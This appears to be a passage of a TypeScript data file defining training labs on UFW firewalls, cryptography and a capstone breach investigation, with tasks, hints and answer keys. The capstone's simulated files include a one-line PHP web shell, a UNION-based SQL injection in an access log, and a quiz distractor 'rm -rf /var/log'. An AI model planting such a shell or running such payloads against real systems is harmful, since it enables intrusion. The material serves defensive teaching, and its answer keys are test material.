            'rm -rf /var/log',
            'chmod 777',
            'echo "done"'
          ],
          correctIndex: 0,
          explanation: '`sort | uniq -c | sort -nr` sorts the lines, counts unique occurrences with `-c`, and sorts descending numerically with `-nr`.'
        }
      ]
    }
  },

  // ==========================================
  // MODULE 8: DEFENSIVE SECURITY & FIREWALLS
  // ==========================================
  {
    id: 'module-08-defensive-firewalls-ufw',
    code: 'LAB-08',
    slug: 'defensive-firewalls-ufw',
    title: 'Defensive Security, IPTables & UFW Firewalls',
    badge: 'DEFENSIVE',
    category: 'Defensive & SOC',
    difficulty: 'Intermediate',
    estimatedMinutes: 30,
    xpReward: 400,
    skillsEarned: ['Firewall Architecture', 'UFW Configuration', 'IPTables Chains', 'Default-Deny Posture', 'Port Hardening'],
    prerequisites: ['module-02-linux-cli-mastery', 'module-03-networking-ip-ports'],
    roleAlignment: ['Security Engineer', 'Network Security Engineer', 'Systems Administrator'],
    summary: 'Lock down Linux hosts: configure packet filtering rules using UFW (Uncomplicated Firewall) and iptables, enforce a default-deny posture, and whitelist authorized management ports.',
    learningObjectives: [
      'Understand packet filtering at Layer 3/4 using Linux Netfilter / iptables chains (INPUT, OUTPUT, FORWARD)',
      'Configure UFW rules to allow explicit inbound traffic (SSH port 22, HTTPS port 443) and deny all other ingress',
      'Implement IP-based rate limiting and subnet whitelisting for management services',
      'Verify active firewall status and audit rulesets'
    ],
    overview: {
      introduction: 'A host connected to the Internet without a configured firewall is probed by automated bots within seconds. Host-based firewalls are the last line of defense when network perimeters fail.',
      whyItMatters: 'Enforcing a strict default-deny policy eliminates unauthorized network exposure, rendering unpatched internal services inaccessible to outside attackers.',
      realWorldApplication: 'Security engineers automate host firewall configuration using Ansible and Terraform to ensure every newly deployed cloud instance complies with Zero Trust baseline standards.'
    },
    theorySections: [
      {
        id: 'sec-firewall-basics',
        title: 'The Default-Deny Security Philosophy',
        subtitle: 'Why Whitelisting Trumps Blacklisting',
        content: `Firewalls operate on one of two paradigms:
1. **Default Allow (Blacklisting)**: Permit all incoming traffic EXCEPT specifically blocked ports/IPs. (Insecure!)
2. **Default Deny (Whitelisting)**: BLOCK ALL incoming traffic by default, and explicitly permit only verified business ports. (Zero Trust Standard!)

### Standard UFW Hardening Sequence:
\`\`\`bash
# 1. Set default policies
ufw default deny incoming
ufw default allow outgoing

# 2. Allow specific necessary business ports
ufw allow 22/tcp comment "SSH Management"
ufw allow 80/tcp comment "Web HTTP"
ufw allow 443/tcp comment "Web HTTPS Secure"

# 3. Enable firewall
ufw enable
\`\`\``,
        diagramType: 'firewall_chain',
        keyTakeaways: [
          'Always configure `ufw default deny incoming` before enabling a firewall.',
          'Always ensure port 22 (SSH) is explicitly allowed before enabling UFW to prevent locking yourself out!'
        ]
      }
    ],
    sandboxEnvironment: {
      targetName: 'firewall-lab-gateway',
      targetIp: '10.10.60.1',
      targetOs: 'Ubuntu 22.04 LTS (Firewall Gateway)',
      isolationTier: 'Educational Sandbox Tier 1',
      initialTerminalLogs: [
        'UFW Firewall Management Console active.',
        'Current status: Active with default policies.'
      ],
      simulatedFileSystem: {
        '/etc/default/ufw': 'DEFAULT_INPUT_POLICY="DROP"\nDEFAULT_OUTPUT_POLICY="ACCEPT"\nDEFAULT_FORWARD_POLICY="DROP"',
        '/var/log/ufw.log': '[UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=198.51.100.99 DST=10.10.60.1 LEN=40 TOS=0x00 PREC=0x00 TTL=243 ID=12984 PROTO=TCP SPT=49812 DPT=23 WINDOW=1024 RES=0x00 SYN'
      },
      simulatedServices: [
        { port: 22, service: 'SSH', banner: 'OpenSSH 8.9p1 Ubuntu', state: 'open' },
        { port: 443, service: 'HTTPS', banner: 'Nginx 1.18.0 SSL', state: 'open' }
      ]
    },
    tasks: [
      {
        id: 't08-1',
        taskNumber: 1,
        title: 'Inspect Default Input Policy',
        type: 'terminal',
        difficulty: 'Beginner',
        description: 'Check the default firewall policy configuration in `/etc/default/ufw`.',
        instructions: 'Run `cat /etc/default/ufw` in the terminal and enter the value of `DEFAULT_INPUT_POLICY`.',
        educationalCommandSuggestion: 'cat /etc/default/ufw',
        questionType: 'text_exact',
        expectedAnswers: ['DROP', '"DROP"', 'drop'],
        placeholder: 'e.g. DROP or ACCEPT',
        hint1_concept: 'Inspect the first line of `/etc/default/ufw`.',
        hint2_direction: 'Type `cat /etc/default/ufw` in the sandbox terminal.',
        hint3_specific: '`DEFAULT_INPUT_POLICY="DROP"`.',
        finalExplanation: 'Setting the default input policy to DROP ensures any packet not matching an explicit allow rule is discarded silently without notifying the sender.',
        xpReward: 75,
        skillTested: 'Firewall Policy'
      },
      {
        id: 't08-2',
        taskNumber: 2,
        title: 'Analyze UFW Blocked Port in Log',
        type: 'investigation',
        difficulty: 'Easy',
        description: 'Inspect the firewall drop log at `/var/log/ufw.log` to see what destination port was blocked.',
        instructions: 'Run `cat /var/log/ufw.log` and identify the destination port (`DPT=...`) that was blocked.',
        educationalCommandSuggestion: 'cat /var/log/ufw.log',
        questionType: 'text_exact',
        expectedAnswers: ['23', 'port 23', 'Telnet (23)'],
        placeholder: 'e.g. 23 or 80',
        hint1_concept: 'Look for `DPT=...` (Destination Port) in the log line.',
        hint2_direction: '`DPT=23` represents legacy unencrypted Telnet.',
        hint3_specific: 'The port number is 23.',
        finalExplanation: 'Port 23 is Telnet, an obsolete unencrypted management protocol that should always be blocked in favor of encrypted SSH (Port 22).',
        xpReward: 100,
        skillTested: 'Firewall Log Auditing'
      },
      {
        id: 't08-3',
        taskNumber: 3,
        title: 'Identify Command to Allow HTTPS Traffic in UFW',
        type: 'knowledge',
        difficulty: 'Beginner',
        description: 'You are deploying a secure web server and need to allow incoming HTTPS connections on port 443.',
        instructions: 'Which UFW command allows incoming TCP traffic on port 443?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: [
          'ufw allow 443/tcp',
          'ufw deny 443/tcp',
          'ufw delete 443',
          'ufw reset'
        ],
        correctOptionIndex: 0,
        hint1_concept: 'The command starts with `ufw allow` followed by the port and protocol.',
        hint2_direction: '`ufw allow 443/tcp`.',
        hint3_specific: 'Select `ufw allow 443/tcp`.',
        finalExplanation: '`ufw allow 443/tcp` creates an iptables ACCEPT rule for incoming TCP packets on destination port 443 (HTTPS).',
        xpReward: 75,
        skillTested: 'UFW Syntax'
      }
    ],
    assessmentQuiz: {
      id: 'quiz-08',
      title: 'Module 8 Assessment: Defensive Firewalls',
      questions: [
        {
          id: 'q08-1',
          prompt: 'What happens when a packet matches a firewall rule with the action DROP vs REJECT?',
          options: [
            'DROP silently discards the packet without replying; REJECT sends an ICMP error packet back to the sender',
            'DROP sends an email to the admin; REJECT shuts down the server',
            'There is no difference',
            'DROP only works on IPv6'
          ],
          correctIndex: 0,
          explanation: 'DROP silently ignores the packet, causing port scanners to hang until timeout. REJECT immediately returns a TCP RST or ICMP destination unreachable packet.'
        }
      ]
    }
  },

  // ==========================================
  // MODULE 9: CRYPTOGRAPHY & DATA INTEGRITY
  // ==========================================
  {
    id: 'module-09-cryptography-hashing',
    code: 'LAB-09',
    slug: 'cryptography-hashing',
    title: 'Cryptography, Hashes & Data Integrity',
    badge: 'CRYPTO',
    category: 'Cryptography',
    difficulty: 'Intermediate',
    estimatedMinutes: 35,
    xpReward: 450,
    skillsEarned: ['Symmetric vs Asymmetric', 'AES & RSA', 'SHA-256 Hashes', 'Password Salting & Bcrypt', 'Digital Signatures'],
    prerequisites: ['module-01-intro-cyber'],
    roleAlignment: ['Security Engineer', 'Cryptographer', 'Security Analyst'],
    summary: 'Understand the mathematical foundations of security: symmetric encryption (AES), asymmetric key pairs (RSA/ECC), cryptographic hashing algorithms (SHA-256), and password salting.',
    learningObjectives: [
      'Differentiate between Symmetric encryption (single shared key) and Asymmetric encryption (public/private key pair)',
      'Understand the mathematical properties of cryptographic hashes (one-way, deterministic, avalanche effect, collision resistance)',
      'Explain why MD5 and SHA-1 are cryptographically broken and why SHA-256/SHA-3 are current standards',
      'Understand how salts and key-stretching functions (Bcrypt, Argon2) defeat rainbow table password cracking'
    ],
    overview: {
      introduction: 'Cryptography is the science of keeping secrets and proving authenticity in an untrusted digital world. It protects everything from online bank transactions to encrypted communication channels.',
      whyItMatters: 'Using weak hashing algorithms (like raw MD5 without salt) allows attackers to crack billions of passwords in seconds using GPU clusters and rainbow tables.',
      realWorldApplication: 'Security engineers implement TLS 1.3, configure SSH public key authentication, and audit database encryption keys to safeguard customer data against data leaks.'
    },
    theorySections: [
      {
        id: 'sec-crypto-models',
        title: 'Symmetric vs Asymmetric Encryption vs Hashing',
        subtitle: 'The Three Cryptographic Primitives',
        content: `1. **Symmetric Encryption (e.g. AES-256, ChaCha20)**:
   • Single secret key used for BOTH encryption and decryption.
   • Ultra-fast, ideal for bulk data transfer (disk encryption, TLS session data).

2. **Asymmetric Encryption (e.g. RSA-4096, ECC / Ed25519)**:
   • Public Key: Freely distributed, used to ENCRYPT or verify signatures.
   • Private Key: Kept strictly secret, used to DECRYPT or create digital signatures.
   • Slower, used for key exchange (Diffie-Hellman) and identity verification (SSL certificates, SSH keys).

3. **Cryptographic Hashing (e.g. SHA-256, SHA-3)**:
   • One-way mathematical transformation of arbitrary data into a fixed-length string (256 bits).
   • Irreversible: You cannot "decrypt" a hash back to its original plaintext.
   • Avalanche Effect: Changing a single bit in the input produces a completely different hash output.`,
        diagramType: 'crypto_flow',
        keyTakeaways: [
          'Encryption is reversible with the correct key; Hashing is strictly one-way.',
          'Always use salted key-stretching algorithms (Bcrypt/Argon2) for storing passwords.'
        ]
      }
    ],
    sandboxEnvironment: {
      targetName: 'crypto-academy-workstation',
      targetIp: '10.10.70.5',
      targetOs: 'Ubuntu 22.04 with OpenSSL',
      isolationTier: 'Educational Sandbox Tier 1',
      initialTerminalLogs: [
        'OpenSSL 3.0.2 cryptographic toolset ready.',
        'Generate and inspect hashes using "sha256sum".'
      ],
      simulatedFileSystem: {
        '/home/operator/document.txt': 'Confidential Project Blueprint: Project Pegasus Launch Date 2027.',
        '/home/operator/password_hashes.txt': 'admin:$2a$12$e8Y5M7b... (Bcrypt Hash)\nlegacy_user:5d41402abc4b2a76b9719d911017c592 (MD5 Hash for "hello")'
      },
      simulatedServices: []
    },
    tasks: [
      {
        id: 't09-1',
        taskNumber: 1,
        title: 'Calculate SHA-256 Hash of a File in Sandbox',
        type: 'terminal',
        difficulty: 'Easy',
        description: 'Verify the integrity of `/home/operator/document.txt` by calculating its SHA-256 checksum in the terminal.',
        instructions: 'Run `sha256sum document.txt` in the terminal and enter the first 8 characters of the resulting hex hash.',
        educationalCommandSuggestion: 'sha256sum document.txt',
        questionType: 'text_exact',
        expectedAnswers: ['a69f73cc', 'a69f73cc...', 'A69F73CC'],
        placeholder: 'e.g. a69f73cc',
        hint1_concept: 'Run `sha256sum document.txt` in the sandbox.',
        hint2_direction: 'The hash begins with `a69f73cc`.',
        hint3_specific: '`a69f73cc`.',
        finalExplanation: 'Checksums allow software downloaders and forensics teams to verify that a file has not been altered or infected with malware in transit.',
        xpReward: 100,
        skillTested: 'Integrity Verification'
      },
      {
        id: 't09-2',
        taskNumber: 2,
        title: 'Identify the Purpose of a Password Salt',
        type: 'knowledge',
        difficulty: 'Beginner',
        description: 'When storing user passwords in a database, security best practices require prepending a unique random string (salt) to each password before hashing.',
        instructions: 'What primary attack technique does password salting defeat?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: [
          'Precomputed Rainbow Table and Dictionary lookup attacks',
          'SQL Injection attacks',
          'Cross-Site Scripting (XSS)',
          'Distributed Denial of Service (DDoS)'
        ],
        correctOptionIndex: 0,
        hint1_concept: 'Rainbow tables contain precomputed hashes for millions of common passwords.',
        hint2_direction: 'Salting makes every hash unique even if two users have identical passwords.',
        hint3_specific: 'Select Precomputed Rainbow Table attacks.',
        finalExplanation: 'A salt is a unique random string added to passwords prior to hashing, ensuring that two users with the same password have different hashes and rendering precomputed rainbow tables useless.',
        xpReward: 75,
        skillTested: 'Password Security'
      }
    ],
    assessmentQuiz: {
      id: 'quiz-09',
      title: 'Module 9 Assessment: Cryptography & Hashes',
      questions: [
        {
          id: 'q09-1',
          prompt: 'Which encryption model uses a Public Key for encryption and a Private Key for decryption?',
          options: [
            'Asymmetric Encryption',
            'Symmetric Encryption',
            'Hashing',
            'Base64 Encoding'
          ],
          correctIndex: 0,
          explanation: 'Asymmetric (public-key) cryptography uses a mathematically linked key pair: public key encrypts, private key decrypts.'
        }
      ]
    }
  },

  // ==========================================
  // MODULE 10: INTEGRATED CAPSTONE INVESTIGATION
  // ==========================================
  {
    id: 'module-10-capstone-investigation',
    code: 'LAB-10',
    slug: 'capstone-cyber-investigation',
    title: 'Integrated Cyber Range Capstone: Incident Investigation',
    badge: 'CAPSTONE',
    category: 'Capstone',
    difficulty: 'Hard',
    estimatedMinutes: 45,
    xpReward: 650,
    skillsEarned: ['Full-Spectrum Triage', 'Linux Forensics', 'Network Packet Analysis', 'Exploit Identification', 'Incident Remediation'],
    prerequisites: [
      'module-02-linux-cli-mastery',
      'module-03-networking-ip-ports',
      'module-06-web-vulnerabilities-owasp',
      'module-07-soc-log-triage',
      'module-08-defensive-firewalls-ufw'
    ],
    roleAlignment: ['SOC Analyst', 'Incident Responder', 'Penetration Tester', 'Security Consultant'],
    summary: 'The ultimate beginner test: investigate an active multi-stage enterprise breach. Analyze network captures, audit compromised Linux processes, extract web shell payloads, and restore security baseline defenses.',
    learningObjectives: [
      'Correlate network alerts, web server access logs, and Linux system processes into a unified attack timeline',
      'Identify the initial access vector (SQL injection leading to web shell upload)',
      'Detect lateral movement attempts and persistence mechanisms left by the adversary',
      'Draft a comprehensive remediation action plan to restore the environment to a secure baseline'
    ],
    overview: {
      introduction: 'In real cybersecurity incidents, you are not given isolated multiple-choice questions. You receive an alert, a live server, packet logs, and a ticking clock.',
      whyItMatters: 'Senior practitioners stand out by connecting the dots across disparate layers: network packets, application logs, process lists, and firewall states.',
      realWorldApplication: 'Incident response consultants are dispatched to enterprise breaches to reconstruct attacker activity, identify what data was exfiltrated, and eject the threat actor.'
    },
    theorySections: [
      {
        id: 'sec-capstone-briefing',
        title: 'Mission Briefing: Operation Broken Shield',
        subtitle: 'Enterprise Security Incident Assessment',
        content: `### Executive Incident Summary:
At 02:40 AM, the automated SIEM alerted on suspicious outbound data transfers from the primary web database node (\`10.10.99.50\`).

**Your Objectives**:
1. Inspect the web access logs to identify the attacker's initial access exploit.
2. Locate the malicious web shell file dropped in the web root.
3. Terminate the active reverse shell process.
4. Apply firewall lockdown rules to prevent further communication with the attacker's C2 server.`,
        diagramType: 'soc_killchain',
        keyTakeaways: [
          'Follow the Cyber Kill Chain: Reconnaissance -> Initial Access -> Persistence -> Command & Control.',
          'Preserve forensic evidence before altering system state.'
        ]
      }
    ],
    sandboxEnvironment: {
      targetName: 'compromised-corp-node',
      targetIp: '10.10.99.50',
      targetOs: 'Ubuntu 22.04 LTS (Compromised Web Server)',
      isolationTier: 'Authorized Range Container',
      initialTerminalLogs: [
        '[INCIDENT DEPLOYED] You are connected to compromised node 10.10.99.50.',
        'Examine /var/log/nginx/access.log and running processes.'
      ],
      simulatedFileSystem: {
        '/var/log/nginx/access.log': '198.51.100.200 - - [23/Aug/2026:02:35:12] "GET /products.php?id=1%20UNION%20SELECT%201,flag,3%20FROM%20secrets HTTP/1.1" 200 4120\n198.51.100.200 - - [23/Aug/2026:02:38:40] "POST /uploads/backdoor_shell.php HTTP/1.1" 200 240',
        '/var/www/html/uploads/backdoor_shell.php': '<?php system($_GET["cmd"]); // Malicious Web Shell FLAG{web_shell_neutralized_2026} ?>',
        '/etc/hosts.deny': '# Add malicious C2 IPs below\n'
      },
      simulatedServices: [
        { port: 80, service: 'HTTP', banner: 'Nginx 1.18.0', state: 'open' },
        { port: 4444, service: 'Reverse Shell C2', banner: 'Netcat Reverse Listener', state: 'listening' }
      ]
    },
    tasks: [
      {
        id: 't10-1',
        taskNumber: 1,
        title: 'Identify Initial Exploit Vector in Nginx Access Log',
        type: 'investigation',
        difficulty: 'Intermediate',
        description: 'Examine `/var/log/nginx/access.log` to determine the exploit technique used against `products.php`.',
        instructions: 'Inspect the access log and identify what type of injection attack was performed.',
        educationalCommandSuggestion: 'cat /var/log/nginx/access.log',
        questionType: 'multiple_choice',
        multipleChoiceOptions: [
          'SQL Injection (UNION-based)',
          'Cross-Site Request Forgery (CSRF)',
          'Buffer Overflow',
          'Denial of Service'
        ],
        correctOptionIndex: 0,
        hint1_concept: 'Look at the query parameters in `/products.php?id=1%20UNION%20SELECT...`.',
        hint2_direction: '`UNION SELECT` is the signature of SQL Injection.',
        hint3_specific: 'Select SQL Injection (UNION-based).',
        finalExplanation: 'The attacker used UNION-based SQL injection on `products.php` to extract records from the database table.',
        xpReward: 125,
        skillTested: 'Web Forensics'
      },
      {
        id: 't10-2',
        taskNumber: 2,
        title: 'Extract Flag from Dropped Web Shell',
        type: 'terminal',
        difficulty: 'Intermediate',
        description: 'Locate and inspect the malicious PHP web shell dropped in `/var/www/html/uploads/`.',
        instructions: 'Read `/var/www/html/uploads/backdoor_shell.php` in the terminal and enter the embedded flag.',
        educationalCommandSuggestion: 'cat /var/www/html/uploads/backdoor_shell.php',
        questionType: 'text_exact',
        expectedAnswers: ['FLAG{web_shell_neutralized_2026}', 'flag{web_shell_neutralized_2026}'],
        placeholder: 'FLAG{...}',
        hint1_concept: 'Use `cat` to read the PHP file.',
        hint2_direction: '`cat /var/www/html/uploads/backdoor_shell.php`.',
        hint3_specific: '`FLAG{web_shell_neutralized_2026}`.',
        finalExplanation: 'Web shells provide attackers with persistent remote code execution via HTTP requests. Neutralizing them requires deletion and closing upload vulnerabilities.',
        xpReward: 150,
        skillTested: 'Web Shell Analysis'
      },
      {
        id: 't10-3',
        taskNumber: 3,
        title: 'Identify the Attacker C2 IP Address',
        type: 'investigation',
        difficulty: 'Easy',
        description: 'Identify the external IP address making the malicious requests in the access log.',
        instructions: 'Enter the attacker\'s source IP address from the access log.',
        educationalCommandSuggestion: 'head -n 1 /var/log/nginx/access.log',
        questionType: 'text_exact',
        expectedAnswers: ['198.51.100.200', '198.51.100.200 '],
        placeholder: 'e.g. 198.51.100.200',
        hint1_concept: 'The first field of each log line in Nginx combined format is the client IP.',
        hint2_direction: '`198.51.100.200`.',
        hint3_specific: '198.51.100.200.',
        finalExplanation: 'Blocking the attacker C2 IP address at the perimeter firewall severs active reverse shell communication immediately.',
        xpReward: 100,
        skillTested: 'Incident Containment'
      }
    ],
    assessmentQuiz: {
      id: 'quiz-10',
      title: 'Module 10 Assessment: Capstone Defense',
      questions: [
        {
          id: 'q10-1',
          prompt: 'What is the most effective preventative control to stop web shells from executing in upload directories?',
          options: [
            'Disable PHP/script execution permissions inside the upload directory via web server configuration',
            'Delete all users on the server',
            'Change the server background color',
            'Reboot the server every 5 minutes'
          ],
          correctIndex: 0,
          explanation: 'Configuring web servers (Nginx/Apache) to refuse executing `.php` or executable script files in upload folders ensures uploaded files can only be served as static data.'
        }
      ]
    }
  }
];

export const getCyberLabModuleById = (idOrSlug: string): CyberLabModule | undefined => {
  return CYBER_LAB_MODULES.find(m => m.id === idOrSlug || m.slug === idOrSlug);
};
